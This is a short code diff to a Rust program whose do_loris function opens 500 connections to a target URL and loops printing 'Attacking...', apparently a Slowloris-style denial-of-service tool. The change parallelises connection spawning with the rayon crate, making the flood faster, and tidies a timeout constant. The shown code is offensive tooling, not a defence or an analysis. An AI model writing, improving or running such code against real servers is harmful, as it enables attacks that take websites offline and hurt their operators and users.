@@ -1,9 +1,11 @@
 extern crate native_tls;
 extern crate url;
 extern crate rand;
+extern crate rayon;
 use url::{Url, ParseError};
 
 use native_tls::{TlsConnector, TlsStream};
+use rayon::prelude::*;
 use std::io::{self, Read, Write};
 use std::net::TcpStream;
 use std::time::Duration;
@@ -87,10 +89,11 @@ pub fn do_loris(url: &str) -> Result<(), LorisError> {
     let connection_num = 500;
     let init_header = get_init_header(&url);
     let mut connections: Vec<_> = (0..connection_num)
+        .into_par_iter()
         .map(|_| spawn_connection(&url, &init_header))
         .collect();
 
-    let timeout = 4000;
+    let timeout = 4_000;
     loop {
         println!("Attacking...");
         for connection in &mut connections {
